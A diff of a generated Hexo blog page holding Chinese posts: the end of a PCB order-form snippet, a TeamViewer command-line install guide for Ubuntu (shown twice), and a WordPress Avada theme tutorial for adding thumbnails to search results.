+                &lt;div id=&quot;jieg&quot;&gt;
+                    &lt;div&gt;
+                        订单明细：
+                    &lt;/div&gt;
+                &lt;/div&gt;
+
+              &lt;span&gt;板子层数: &#123;&#123; picked &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;板子宽度: &#123;&#123; kuang &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;板子宽度: &#123;&#123; chang &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;板子数量: &#123;&#123; shuliangss &#125;&#125;&lt;/span&gt;&lt;br&gt;
+              &lt;span&gt;板子厚度: &#123;&#123; banhoudu &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;拼版款数: &#123;&#123; pingbanks &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;字符颜色: &#123;&#123; zifuys &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;阻焊颜色: &#123;&#123; zuhanys &#125;&#125;&lt;/span&gt;&lt;br&gt;
+              &lt;span&gt;需要发票？: &#123;&#123; selected &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;发货时间: &#123;&#123; fahuo &#125;&#125;&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;阻焊覆盖: &#123;&#123; zuhanfg &#125;&#125;&lt;/span&gt;&lt;br&gt;
+              &lt;span&gt;飞针测试: &#123;&#123; feizhen &#125;&#125;&lt;/span&gt;
+                &lt;script&gt;
+                    new Vue(&#123;
+                      el: &#39;#zhib-zhognjain&#39;,
+                      data: &#123;
+                        picked : &#39;2&#39;,
+                        kuang : &#39;&#39;,
+                        chang : &#39;&#39;,
+                        shuliangss : &#39;&#39;,
+                        banhoudu : &#39;&#39;,
+                        pingbanks : &#39;1&#39;,
+                        zifuys : &#39;&#39;,
+                        zuhanys : &#39;&#39;,
+                        selected : &#39;&#39;,
+                        fahuo : &#39;&#39;,
+                        zuhanfg : &#39;&#39;,
+                        feizhen : &#39;&#39;,
+                        options: [
+                          &#123; text: &#39;不测试&#39;, value: &#39;0&#39; &#125;,
+                          &#123; text: &#39;全部测试(免费)&#39;, value: &#39;15&#39; &#125;
+                        ]
+                      &#125;
+                    &#125;)
+                &lt;/script&gt;
+
+
+            &lt;/div&gt;
+            &lt;div id=&quot;jisuan-jieguo&quot;&gt;
+                &lt;p&gt;
+                &lt;span&gt;&lt;a href=&quot;javascript:;&quot; onclick=&quot;PMT();&quot;&gt;计算&lt;/a&gt;&lt;/span&gt;
+                &lt;span&gt;&lt;a href=&quot;javascript:;&quot; onclick=&quot;calClear();&quot;&gt;清空&lt;/a&gt;&lt;/span&gt;
+                &lt;span&gt;&lt;a href=&quot;#&quot; class=&quot;button&quot; onClick=&quot;closeTuceng()&quot;&gt;关闭&lt;/a&gt;&lt;/span&gt;
+                &lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div id=&quot;mianze&quot;&gt;
+                &lt;p&gt;
+                    版权归诺科帝科技有限公司所有。
+                &lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/06/2017-11-06-ubuntu%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%BD%A2%E5%BC%8F%E5%AE%89%E8%A3%85teamviewer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/06/2017-11-06-ubuntu%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%BD%A2%E5%BC%8F%E5%AE%89%E8%A3%85teamviewer/" class="post-title-link" itemprop="url">Ubuntu下命令形式安装TeamViewer</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-06 09:35:00" itemprop="dateCreated datePublished" datetime="2017-11-06T09:35:00+08:00">2017-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:36" itemprop="dateModified" datetime="2020-10-11T11:53:36+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>第一步: 下载 安装包<br>从官网下载ubuntu的deb安装包 下载链接：<a target="_blank" rel="noopener" href="https://downloadus1.teamviewer.com/download/version_12x/teamviewer_12.0.71510_i386.deb">https://downloadus1.teamviewer.com/download/version_12x/teamviewer_12.0.71510_i386.deb</a> 应该是外网下载比较慢,耐心等待.</p>
+<p>第二步: 执行命令</p>
+<pre><code>## 不加sudo 会提示照片中的错误：dpkg:error:requestd operation requires superuser privilege 
+## teamviewer_12.0.71510_i386.deb 为下载的安装包名称 &gt;&gt; sudo dpkg -i teamviewer_12.0.71510_i386.deb   dpkg: error processing package teamviewer:i386 (--install):  dependency problems - leaving unconfigured Processing triggers for mime-support (3.59ubuntu1) ... Processing triggers for hicolor-icon-theme (0.15-0ubuntu1) ... Errors were encountered while processing:  teamviewer:i386</code></pre>
+<p>[TOC]</p>
+<p>##报错原因:这是由于我的ubuntu系统是64位的，必须添加32位的架构。</p>
+<p><strong>第三步:添加32位架构</strong><br>​    &gt;&gt; sudo dpkg –add-architecture i386 &gt;&gt; sudo apt-get update<br>##在缺少依赖包的安装 需要执行：sudo apt-get -f install<br>​    &gt;&gt; sudo apt-get -f install</p>
+<p><strong>第四步:执行安装命令</strong><br>##执行安装程序命令:sudo dpkg -i teamviewer_11.0.xxxxx_i386.deb<br>​    &gt;&gt; sudo dpkg -i teamviewer_12.0.71510_i386.deb<br>##出现 Processing xxxx表示安装成功</p>
+<p><strong>第五步:接受license</strong></p>
+<p>5.1 停止teamview<br>##停止服务。执行命令<br>​    &gt;&gt; sudo teamviewer –daemon stop</p>
+<p><strong>5.2 修改配置文件</strong></p>
+<p>##在文件/opt/teamviewer/config/global.conf末尾增加以下内容（由于只读限制，所以可能需要用到管理员权限）</p>
+<pre><code>## [int32] EulaAccepted = 1
+## [int32] EulaAcceptedRevision = 6
+&gt;&gt; cd /opt/teamviewer/config/
+&gt;&gt; ll
+&gt;&gt; vim global.conf
+## 添加一下内容
+## [int32] EulaAccepted = 1
+## [int32] EulaAcceptedRevision = 6
+## 保存退出
+&gt;&gt; wq
+## 为了一次成功,修改文件后最好是查看一下修改的文件
+&gt;&gt; cat global.conf</code></pre>
+<p>##确认添加保存了之后启动teamviewer</p>
+<p><strong>5.3 启动teamviewer</strong><br>##启动teamviewer<br>​    &gt;&gt; sudo teamviewer –daemon start</p>
+<p><strong>第六步:获取Teamviewer ID</strong><br>##获取teamviewer ID<br>​    &gt;&gt; teamviewer –info print id</p>
+<p><strong>第七步:设置密码</strong><br>##设置teamviewer 密码<br>​    &gt;&gt; sudo teamviewer –passwd [NEWPASSWORD]</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/06/2017-11-06-ubuntu%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%BD%A2%E5%BC%8F%E5%AE%89%E8%A3%85teamviewer_20190826_183127/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/06/2017-11-06-ubuntu%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%BD%A2%E5%BC%8F%E5%AE%89%E8%A3%85teamviewer_20190826_183127/" class="post-title-link" itemprop="url">Ubuntu下命令形式安装TeamViewer</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-06 09:35:00" itemprop="dateCreated datePublished" datetime="2017-11-06T09:35:00+08:00">2017-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:36" itemprop="dateModified" datetime="2020-10-11T11:53:36+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>第一步: 下载 安装包<br>从官网下载ubuntu的deb安装包 下载链接：<a target="_blank" rel="noopener" href="https://downloadus1.teamviewer.com/download/version_12x/teamviewer_12.0.71510_i386.deb">https://downloadus1.teamviewer.com/download/version_12x/teamviewer_12.0.71510_i386.deb</a> 应该是外网下载比较慢,耐心等待.</p>
+<p>第二步: 执行命令</p>
+<pre><code>## 不加sudo 会提示照片中的错误：dpkg:error:requestd operation requires superuser privilege 
+## teamviewer_12.0.71510_i386.deb 为下载的安装包名称 &gt;&gt; sudo dpkg -i teamviewer_12.0.71510_i386.deb   dpkg: error processing package teamviewer:i386 (--install):  dependency problems - leaving unconfigured Processing triggers for mime-support (3.59ubuntu1) ... Processing triggers for hicolor-icon-theme (0.15-0ubuntu1) ... Errors were encountered while processing:  teamviewer:i386</code></pre>
+<p>[TOC]</p>
+<p>##报错原因:这是由于我的ubuntu系统是64位的，必须添加32位的架构。</p>
+<p><strong>第三步:添加32位架构</strong><br>​    &gt;&gt; sudo dpkg –add-architecture i386 &gt;&gt; sudo apt-get update<br>##在缺少依赖包的安装 需要执行：sudo apt-get -f install<br>​    &gt;&gt; sudo apt-get -f install</p>
+<p><strong>第四步:执行安装命令</strong><br>##执行安装程序命令:sudo dpkg -i teamviewer_11.0.xxxxx_i386.deb<br>​    &gt;&gt; sudo dpkg -i teamviewer_12.0.71510_i386.deb<br>##出现 Processing xxxx表示安装成功</p>
+<p><strong>第五步:接受license</strong></p>
+<p>5.1 停止teamview<br>##停止服务。执行命令<br>​    &gt;&gt; sudo teamviewer –daemon stop</p>
+<p><strong>5.2 修改配置文件</strong></p>
+<p>##在文件/opt/teamviewer/config/global.conf末尾增加以下内容（由于只读限制，所以可能需要用到管理员权限）</p>
+<pre><code>## [int32] EulaAccepted = 1
+## [int32] EulaAcceptedRevision = 6
+&gt;&gt; cd /opt/teamviewer/config/
+&gt;&gt; ll
+&gt;&gt; vim global.conf
+## 添加一下内容
+## [int32] EulaAccepted = 1
+## [int32] EulaAcceptedRevision = 6
+## 保存退出
+&gt;&gt; wq
+## 为了一次成功,修改文件后最好是查看一下修改的文件
+&gt;&gt; cat global.conf</code></pre>
+<p>##确认添加保存了之后启动teamviewer</p>
+<p><strong>5.3 启动teamviewer</strong><br>##启动teamviewer<br>​    &gt;&gt; sudo teamviewer –daemon start</p>
+<p><strong>第六步:获取Teamviewer ID</strong><br>##获取teamviewer ID<br>​    &gt;&gt; teamviewer –info print id</p>
+<p><strong>第七步:设置密码</strong><br>##设置teamviewer 密码<br>​    &gt;&gt; sudo teamviewer –passwd [NEWPASSWORD]</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/01/%E5%85%B3%E4%BA%8E%E8%AE%A9%E7%BD%91%E7%AB%99%E6%90%9C%E7%B4%A2portfolio%E7%BB%93%E6%9E%9C%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/01/%E5%85%B3%E4%BA%8E%E8%AE%A9%E7%BD%91%E7%AB%99%E6%90%9C%E7%B4%A2portfolio%E7%BB%93%E6%9E%9C%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" class="post-title-link" itemprop="url">关于让网站搜索portfolio结果的内容显示图片的解决方案</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-01 17:18:54" itemprop="dateCreated datePublished" datetime="2017-11-01T17:18:54+08:00">2017-11-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:02" itemprop="dateModified" datetime="2020-10-11T11:53:02+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>我们以Avada主题为例，进行讲解。</p>
+<p>首先我们需要有网站的FTP账号，进入到主题的根目录下，找到search.php，这个是用来控制搜索结果的php文件，我们用浏览器开发者工具可以看到</p>
+<pre><code>&lt;main class=&#39;content template-search &lt;?php avia_layout_class( &#39;content&#39; ); ?&gt; units&#39; &lt;?php avia_markup_helper(array(&#39;context&#39; =&gt; &#39;content&#39;));?&gt;&gt;
+
+&lt;div class=&#39;page-heading-container clearfix&#39;&gt;
+    &lt;section class=&quot;search_form_field&quot;&gt;
+        &lt;?php
+        echo &quot;&lt;h4&gt;&quot;.__(&#39;New Search&#39;,&#39;avia_framework&#39;).&quot;&lt;/h4&gt;&quot;;
+        echo &quot;&lt;p&gt;&quot;.__(&#39;If you are not happy with the results below please do another search&#39;,&#39;avia_framework&#39;).&quot;&lt;/p&gt;&quot;;
+
+        get_search_form();
+        echo &quot;&lt;span class=&#39;author-extra-border&#39;&gt;&lt;/span&gt;&quot;;
+        ?&gt;
+    &lt;/section&gt;
+&lt;/div&gt;
+
+
+&lt;?php
+if(!empty($_GET[&#39;s&#39;]) || have_posts())
+&#123;
+    echo &quot;&lt;h4 class=&#39;extra-mini-title widgettitle&#39;&gt;你搜出了&#123;$results&#125;&lt;/h4&gt;&quot;;
+
+    /* Run the loop to output the posts.
+    * If you want to overload this in a child theme then include a file
+    * called loop-search.php and that will be used instead.
+    */
+    $more = 0;
+    get_template_part( &#39;includes/loop&#39;, &#39;search&#39; );
+
+&#125;
+
+?&gt;
+
+&lt;!--end content--&gt;
+&lt;/main&gt;</code></pre>
+<p>这里是控制显示的区域，由<main></main>标签包含着。这里我们通过观察，可以看到</p>
+<pre><code>get_template_part( &#39;includes/loop&#39;, &#39;search&#39; );</code></pre>
+<p>是控制搜索结果的循环输出的地方，这里有个路径，我们顺藤摸瓜，可以找到includes文件夹下的，loop-search.php文件，这个可能不是很好理解，这个是wordpress的一个写法，具体可以参考<a target="_blank" rel="noopener" href="https://developer.wordpress.org/reference/functions/get_template_part/">这里</a>，他的写法如下：</p>
+<pre><code>get_template_part( $slug, $name );</code></pre>
+<p>意思就是$slug是前面部分，后面的$name是非必须的。官网给出一个很好的例子。</p>
+<p>Assuming the theme folder is wp-content/themes, that the parent theme is twentyten, and the child theme is twentytenchild, then the following code —</p>
+<pre><code>&lt;?php get_template_part( &#39;loop&#39;, &#39;index&#39; ); ?&gt;</code></pre>
+<p>will do a PHP require() for the first file that exists among these, in this priority:</p>
+<ul>
+<li>wp-content/themes/twentytenchild/loop-index.php</li>
+</ul>
+<ul>
+<li>wp-content/themes/twentyten/loop-index.php</li>
+</ul>
+<ul>
+<li>wp-content/themes/twentytenchild/loop.php</li>
+</ul>
+<ul>
+<li>wp-content/themes/twentyten/loop.php</li>
+</ul>
+<p>已经说得很明白了，我们现在要找的是在includes文件夹下的loop-search.php这个文件。并且打开这个文件。配合浏览器开发者工具定位到：</p>
+<pre><code>&lt;article &lt;?php post_class(&#39;post-entry post-entry-type-&#39;.$post_format . &quot; &quot; . $post_class . &quot; &quot;); avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry&#39;)); ?&gt;&gt;
+    &lt;div class=&quot;entry-content-wrapper clearfix &lt;?php echo $post_format; ?&gt;-content&quot;&gt;
+
+&lt;header class=&quot;entry-content-header&quot;&gt;
+
+            &lt;?php
+            echo &quot;&lt;span class=&#39;search-result-counter &#123;$counterclass&#125;&#39;&gt;&#123;$post_loop_count&#125;&lt;/span&gt;&quot;;
+            //echo the post title
+            $markup = avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_title&#39;,&#39;echo&#39;=&gt;false));
+            echo &quot;&lt;h2 class=&#39;post-title entry-title&#39;&gt;&lt;a title=&#39;&quot;.the_title_attribute(&#39;echo=0&#39;).&quot;&#39; href=&#39;&quot;.get_permalink().&quot;&#39; $markup&gt;&quot;.get_the_title().&quot;&lt;/a&gt;&lt;/h2&gt;&quot;;
+
+            ?&gt;
+            &lt;span class=&#39;post-meta-infos&#39;&gt;
+                &lt;time class=&#39;date-container minor-meta updated&#39; &lt;?php avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_time&#39;)); ?&gt;&gt;
+                    &lt;?php the_time(&#39;d M Y&#39;); ?&gt;
+                &lt;/time&gt;
+                &lt;?php
+                if(get_post_type() !== &quot;page&quot;)
+                &#123;
+                    if ( get_comments_number() != &quot;0&quot; || comments_open() )
+                    &#123;
+                        echo &quot;&lt;span class=&#39;text-sep&#39;&gt;/&lt;/span&gt;&quot;;
+                        echo &quot;&lt;span class=&#39;comment-container minor-meta&#39;&gt;&quot;;
+                        comments_popup_link(  &quot;0 &quot;.__(&#39;Comments&#39;,&#39;avia_framework&#39;),
+                                              &quot;1 &quot;.__(&#39;Comment&#39; ,&#39;avia_framework&#39;),
+                                              &quot;% &quot;.__(&#39;Comments&#39;,&#39;avia_framework&#39;),&#39;comments-link&#39;,
+                                              &quot;&quot;.__(&#39;Comments Disabled&#39;,&#39;avia_framework&#39;));
+                        echo &quot;&lt;/span&gt;&quot;;
+                    &#125;
+                &#125;
+
+
+                $taxonomies  = get_object_taxonomies(get_post_type($the_id));
+                $cats = &#39;&#39;;
+                $excluded_taxonomies = array_merge( get_taxonomies( array( &#39;public&#39; =&gt; false ) ), array(&#39;post_tag&#39;,&#39;post_format&#39;) );
+                $excluded_taxonomies = apply_filters(&#39;avf_exclude_taxonomies&#39;, $excluded_taxonomies, get_post_type($the_id), $the_id);
+
+                if(!empty($taxonomies))
+                &#123;
+                    foreach($taxonomies as $taxonomy)
+                    &#123;
+                        if(!in_array($taxonomy, $excluded_taxonomies))
+                        &#123;
+                            $cats .= get_the_term_list($the_id, $taxonomy, &#39;&#39;, &#39;, &#39;,&#39;&#39;).&#39; &#39;;
+                        &#125;
+                    &#125;
+                &#125;
+
+                if(!empty($cats))
+                &#123;
+                    echo &quot;&lt;span class=&#39;text-sep&#39;&gt;/&lt;/span&gt;&quot;;
+                    echo &#39;&lt;span class=&quot;blog-categories minor-meta&quot;&gt;&#39;.__(&#39;in&#39;,&#39;avia_framework&#39;).&quot; &quot;;
+                    echo $cats;
+                    echo &#39;&lt;/span&gt;&#39;;
+                &#125;
+
+                ?&gt;
+
+            &lt;/span&gt;
+      &lt;/header&gt;
+   &lt;/div&gt;
+
+    &lt;footer class=&quot;entry-footer&quot;&gt;&lt;/footer&gt;
+
+    &lt;?php do_action(&#39;ava_after_content&#39;, $the_id, &#39;loop-search&#39;); ?&gt;
+&lt;/article&gt;&lt;!--end post-entry--&gt;</code></pre>
+<p>然后我们的原来是搜索出来的效果是：</p>
+<p><img src="https://i.imgur.com/7mXLzhg.png"></p>
+<p>我们把上面的代码添加一个显示缩略图的功能，找到合适的位置把以下代码：</p>
+<pre><code>&lt;?php include( TEMPLATEPATH . &#39;/thumbnail.php&#39; ); ?&gt;</code></pre>
+<p>其中我们准备一个thumbnail.php文件，放在主题跟目录下，里面的代码内容如下：</p>
+<pre><code>&lt;div class=&quot;thumbnail_t&quot;&gt;
+    &lt;?php if ( get_post_meta($post-&gt;ID, &#39;thumbnail&#39;, true) ) : ?&gt;
+    &lt;?php $image = get_post_meta($post-&gt;ID, &#39;thumbnail&#39;, true); ?&gt;
+    &lt;a href=&quot;&lt;?php the_permalink() ?&gt;&quot; rel=&quot;bookmark&quot; title=&quot;&lt;?php the_title(); ?&gt;&quot;&gt;&lt;img src=&quot;&lt;?php echo $image; ?&gt;&quot; alt=&quot;&lt;?php the_title(); ?&gt;&quot;/&gt;&lt;/a&gt;
+    &lt;?php else: ?&gt;
+&lt;/div&gt;
+&lt;!-- 截图 --&gt;
+&lt;div class=&quot;thumbnail&quot;&gt;
+&lt;a href=&quot;&lt;?php the_permalink() ?&gt;&quot; rel=&quot;bookmark&quot; title=&quot;&lt;?php the_title(); ?&gt;&quot;&gt;
+&lt;?php if (has_post_thumbnail()) &#123; the_post_thumbnail(&#39;thumbnail&#39;); &#125;
+else &#123; ?&gt;
+&lt;img class=&quot;home-thumb&quot; src=&quot;&lt;?php echo catch_first_image() ?&gt;&quot; width=&quot;100%&quot; height=&quot;auto&quot; alt=&quot;&lt;?php the_title(); ?&gt;&quot;/&gt;
+&lt;?php &#125; ?&gt;
+&lt;/a&gt;
+&lt;?php endif; ?&gt;
+&lt;/div&gt;</code></pre>
+<p>添加到标题前面，显示标题的代码是：</p>
+<pre><code>&lt;h2 class=&#39;post-title entry-title&#39;&gt;&lt;a title=&#39;&quot;.the_title_attribute(&#39;echo=0&#39;).&quot;&#39; href=&#39;&quot;.get_permalink().&quot;&#39; $markup&gt;&quot;.get_the_title().&quot;&lt;/a&gt;&lt;/h2&gt;</code></pre>
+<p>所以在前面添加即可，最后的代码为：</p>
+<pre><code>&lt;article &lt;?php post_class(&#39;post-entry post-entry-type-&#39;.$post_format . &quot; &quot; . $post_class . &quot; &quot;); avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry&#39;)); ?&gt;&gt;
+    &lt;div class=&quot;entry-content-wrapper clearfix &lt;?php echo $post_format; ?&gt;-content&quot;&gt;
+&lt;header class=&quot;entry-content-header&quot;&gt;
+            &lt;?php include( TEMPLATEPATH . &#39;/thumbnail.php&#39; ); ?&gt;  //新添加的显示缩略图的标签
+            &lt;?php
+            echo &quot;&lt;span class=&#39;search-result-counter &#123;$counterclass&#125;&#39;&gt;&#123;$post_loop_count&#125;&lt;/span&gt;&quot;;
+            //echo the post title
+            $markup = avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_title&#39;,&#39;echo&#39;=&gt;false));
+            echo &quot;&lt;h2 class=&#39;post-title entry-title&#39;&gt;&lt;a title=&#39;&quot;.the_title_attribute(&#39;echo=0&#39;).&quot;&#39; href=&#39;&quot;.get_permalink().&quot;&#39; $markup&gt;&quot;.get_the_title().&quot;&lt;/a&gt;&lt;/h2&gt;&quot;;
+
+            ?&gt;
+            &lt;span class=&#39;post-meta-infos&#39;&gt;
+                &lt;time class=&#39;date-container minor-meta updated&#39; &lt;?php avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_time&#39;)); ?&gt;&gt;
+                    &lt;?php the_time(&#39;d M Y&#39;); ?&gt;
+                &lt;/time&gt;
+                &lt;?php
+                if(get_post_type() !== &quot;page&quot;)
+                &#123;
+                    if ( get_comments_number() != &quot;0&quot; || comments_open() )
+                    &#123;
+                        echo &quot;&lt;span class=&#39;text-sep&#39;&gt;/&lt;/span&gt;&quot;;
+                        echo &quot;&lt;span class=&#39;comment-container minor-meta&#39;&gt;&quot;;
+                        comments_popup_link(  &quot;0 &quot;.__(&#39;Comments&#39;,&#39;avia_framework&#39;),
+                                              &quot;1 &quot;.__(&#39;Comment&#39; ,&#39;avia_framework&#39;),
+                                              &quot;% &quot;.__(&#39;Comments&#39;,&#39;avia_framework&#39;),&#39;comments-link&#39;,
+                                              &quot;&quot;.__(&#39;Comments Disabled&#39;,&#39;avia_framework&#39;));
+                        echo &quot;&lt;/span&gt;&quot;;
+                    &#125;
+                &#125;
+
+
+                $taxonomies  = get_object_taxonomies(get_post_type($the_id));
+                $cats = &#39;&#39;;
+                $excluded_taxonomies = array_merge( get_taxonomies( array( &#39;public&#39; =&gt; false ) ), array(&#39;post_tag&#39;,&#39;post_format&#39;) );
+                $excluded_taxonomies = apply_filters(&#39;avf_exclude_taxonomies&#39;, $excluded_taxonomies, get_post_type($the_id), $the_id);
+
+                if(!empty($taxonomies))
+                &#123;
+                    foreach($taxonomies as $taxonomy)
+                    &#123;
+                        if(!in_array($taxonomy, $excluded_taxonomies))
+                        &#123;
+                            $cats .= get_the_term_list($the_id, $taxonomy, &#39;&#39;, &#39;, &#39;,&#39;&#39;).&#39; &#39;;
+                        &#125;
+                    &#125;
+                &#125;
+
+                if(!empty($cats))
+                &#123;
+                    echo &quot;&lt;span class=&#39;text-sep&#39;&gt;/&lt;/span&gt;&quot;;
+                    echo &#39;&lt;span class=&quot;blog-categories minor-meta&quot;&gt;&#39;.__(&#39;in&#39;,&#39;avia_framework&#39;).&quot; &quot;;
+                    echo $cats;
+                    echo &#39;&lt;/span&gt;&#39;;
+                &#125;
+
+                ?&gt;
+
+            &lt;/span&gt;
+     &lt;/header&gt;
+   &lt;/div&gt;
+
+    &lt;footer class=&quot;entry-footer&quot;&gt;&lt;/footer&gt;
+
+    &lt;?php do_action(&#39;ava_after_content&#39;, $the_id, &#39;loop-search&#39;); ?&gt;
+&lt;/article&gt;&lt;!--end post-entry--&gt;</code></pre>
+<p>然后保存，上传覆盖原来的文件即可。</p>
+<p>最后的效果是：</p>
+<p><img src="https://i.imgur.com/nbUT7Bz.png"></p>
+<p>如果想要显示的样式好看点，我们可以在添加一些类，进行优化，我们把上面的代码修改下，改成如下：</p>
+<pre><code>&lt;article &lt;?php post_class(&#39;post-entry post-entry-type-&#39;.$post_format . &quot; &quot; . $post_class . &quot; &quot;); avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry&#39;)); ?&gt;&gt;
+    &lt;div class=&quot;entry-content-wrapper clearfix &lt;?php echo $post_format; ?&gt;-content nocti_customsearch&quot;&gt;   //额外新添加一个nocti_customsearch类,以美化显示搜索结果
+
+        &lt;header class=&quot;entry-content-header&quot;&gt;
+            &lt;span class=&#39;search-result-counter&#39;&gt;    //新添加的显示缩略图的标签
+                &lt;?php include( TEMPLATEPATH . &#39;/thumbnail.php&#39; ); ?&gt;   //新添加的显示缩略图的标签
+            &lt;/span&gt;    //新添加的显示缩略图的标签
+            &lt;?php
+            // echo &quot;&lt;span class=&#39;search-result-counter &#123;$counterclass&#125;&#39;&gt;&#123;$post_loop_count&#125;&lt;/span&gt;&quot;;  //把显示序号的标签注销或者隐藏
+            //echo the post title
+            $markup = avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_title&#39;,&#39;echo&#39;=&gt;false));
+            echo &quot;&lt;h2 class=&#39;post-title entry-title&#39;&gt;&lt;a title=&#39;&quot;.the_title_attribute(&#39;echo=0&#39;).&quot;&#39; href=&#39;&quot;.get_permalink().&quot;&#39; $markup&gt;&quot;.get_the_title().&quot;&lt;/a&gt;&lt;/h2&gt;&quot;;
+
+            ?&gt;
+            &lt;span class=&#39;post-meta-infos&#39;&gt;
+                &lt;time class=&#39;date-container minor-meta updated&#39; &lt;?php avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_time&#39;)); ?&gt;&gt;
+                    &lt;?php the_time(&#39;d M Y&#39;); ?&gt;
+                &lt;/time&gt;
+                &lt;?php
+                if(get_post_type() !== &quot;page&quot;)
+                &#123;
+                    if ( get_comments_number() != &quot;0&quot; || comments_open() )
+                    &#123;
+                        echo &quot;&lt;span class=&#39;text-sep&#39;&gt;/&lt;/span&gt;&quot;;
+                        echo &quot;&lt;span class=&#39;comment-container minor-meta&#39;&gt;&quot;;
+                        comments_popup_link(  &quot;0 &quot;.__(&#39;Comments&#39;,&#39;avia_framework&#39;),
+                                              &quot;1 &quot;.__(&#39;Comment&#39; ,&#39;avia_framework&#39;),
+                                              &quot;% &quot;.__(&#39;Comments&#39;,&#39;avia_framework&#39;),&#39;comments-link&#39;,
